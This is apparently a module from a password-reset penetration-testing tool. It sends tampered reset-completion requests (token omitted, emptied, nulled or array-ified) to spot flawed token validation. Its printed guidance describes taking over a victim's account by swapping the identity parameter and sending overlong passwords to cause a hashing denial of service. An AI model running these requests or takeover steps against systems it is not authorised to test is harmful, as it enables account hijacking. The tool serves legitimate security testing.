#!/usr/bin/env python3
import sys
sys.dont_write_bytecode = True

import json as _json
import re
import urllib.parse

from utils.style import Colors
from utils.utils import requests, detect_content_type, SUCCESS_INDICATORS
from utils import live


TOKEN_PARAMS = ["token", "reset_token", "resetToken", "resettoken", "code",
                "t", "key", "hash", "auth", "oobCode", "verify", "confirmation"]
IDENTITY_PARAMS = ["username", "user", "user_id", "userid", "uid", "id",
                   "email", "login", "account", "account_id", "customer_id"]
PASSWORD_PARAMS = ["password", "new_password", "newPassword", "newpass", "pwd",
                   "pass", "passwd", "confirmPassword", "password_confirmation",
                   "password2", "npwd"]


def _params(body, is_json):
    """Return a dict view of the body params (json or form)."""
    if is_json:
        try:
            d = _json.loads(body)
            return d if isinstance(d, dict) else {}
        except Exception:
            return {}
    try:
        return {k: v[0] for k, v in urllib.parse.parse_qs(body or "", keep_blank_values=True).items()}
    except Exception:
        return {}


_SEP_RE = re.compile(r'[_\-.\[\]]+')


def _key_tokens(key):
    """Split a form key into components so framework-prefixed names match.
    e.g. 'dwfrm_newPasswords_newpassword' → {'dwfrm','newpasswords','newpassword'}."""
    return {t for t in _SEP_RE.split(key.lower()) if t}


def _present(params, names):
    """Body keys matching any of `names`, by exact name OR as a delimited token —
    so SFCC/Rails-style prefixed fields (dwfrm_newPasswords_newpassword,
    user[email]) are recognised, without the false positives of raw substring match."""
    names_l = {n.lower() for n in names}
    out = []
    for k in params:
        kl = k.lower()
        if kl in names_l or (_key_tokens(k) & names_l):
            out.append(k)
    return out


def _rebuild(params, is_json):
    if is_json:
        return _json.dumps(params)
    return urllib.parse.urlencode(params, doseq=True)


def _looks_success(resp, baseline):
    low = (resp.text or "").lower()
    if any(s in low for s in SUCCESS_INDICATORS) and "invalid" not in low and "not valid" not in low:
        return True
    # or "same as the legit completion" (status + size close to baseline)
    return resp.status_code == baseline.get("status") and \
        abs(len(resp.text) - (baseline.get("body_length") or 0)) < 40


def broken_logic(url, parsed_req, baseline, interact, email, proxy=None):
    """
    Broken-logic / token-binding flaws on the password-reset COMPLETION step
    (PortSwigger "broken logic", cross-user token substitution).

    Only meaningful on the *completion* request (token + new password). It:
      • ACTIVELY tests token-integrity flaws that are NON-destructive — omitting,
        emptying, or array-ifying the token (without a valid token nothing can be
        reset, so no account is harmed). A "success" there is a CRITICAL logic bug.
      • ADVISES on the destructive tests (tamper the identity param to a victim
        while keeping your token) rather than firing them, since that would reset
        a third party's password.
    On the request step (email only) it prints the checklist and skips.
    """
    print(f"{Colors.CYAN} ├ Broken logic / token binding{Colors.RESET}")

    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    original_host = parsed_req["host"]
    scheme = urllib.parse.urlparse(url).scheme or ("https" if "https" in (url or "") else "http")
    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None
    is_json = detect_content_type(headers) == "json"

    params = _params(body, is_json)
    tok = _present(params, TOKEN_PARAMS)
    ident = _present(params, IDENTITY_PARAMS)
    pw = _present(params, PASSWORD_PARAMS)

    if not (tok and pw):
        print(f"{Colors.CYAN}   └── [i] Not a reset-completion request (need token + new-password) — "
              f"binding tests skipped.{Colors.RESET}")
        print(f"{Colors.CYAN}       Manual (feed the completion request): keep YOUR token, change the "
              f"identity param (username/email/userid) to the victim → if the reset applies to them, "
              f"the token isn't bound to the account (ATO).{Colors.RESET}")
        return

    print(f"{Colors.CYAN}   └── completion step detected — token={tok} identity={ident or '—'} password={pw}{Colors.RESET}")

    def _send(p):
        return requests.request(method=method, url=uri, headers=headers,
                                data=_rebuild(p, is_json) or None, verify=False,
                                allow_redirects=False, timeout=15, proxies=proxies)

    tkey = tok[0]
    tval = params.get(tkey)
    # --- NON-destructive token-integrity tests (no valid token ⇒ no takeover) ---
    tests = {
        "token removed": {k: v for k, v in params.items() if k != tkey},
        "token emptied": {**params, tkey: ""},
        "token null": {**params, tkey: None} if is_json else {**params, tkey: ""},
        # array bypass: JSON → [value]; form → token[]=value (drop scalar key)
        "token array": ({**params, tkey: [tval]} if is_json
                        else {**{k: v for k, v in params.items() if k != tkey}, f"{tkey}[]": tval}),
    }
    hit = False
    for label, p in tests.items():
        try:
            live.testing(f"broken-logic {label}")
            resp = _send(p)
            if _looks_success(resp, baseline):
                hit = True
                print(f"{Colors.RED}   └── [CRITICAL] completion accepted with {label} → token not properly "
                      f"validated (reset without a valid token){Colors.RESET}")
                print(f"{Colors.RED}       status={resp.status_code} len={len(resp.text)}b — confirm you can set a password{Colors.RESET}")
        except requests.RequestException:
            pass

    if not hit:
        print(f"{Colors.GREEN}   └── [-] Token integrity holds (omit/empty/array all rejected){Colors.RESET}")

    # --- destructive test → guidance only ---
    if ident:
        print(f"{Colors.YELLOW}   └── [i] Identity param(s) {ident} present alongside the token.{Colors.RESET}")
        print(f"{Colors.YELLOW}       Manual (destructive — use a 2nd account you own): keep YOUR valid token, "
              f"change {ident[0]} to the other account → if its password changes, the token is not bound "
              f"to the account (PortSwigger broken logic / ATO).{Colors.RESET}")
    print(f"{Colors.CYAN}   └── [i] Also test: submit another user's token with your identity, and a very long "
          f"password (no length cap → hashing DoS).{Colors.RESET}")
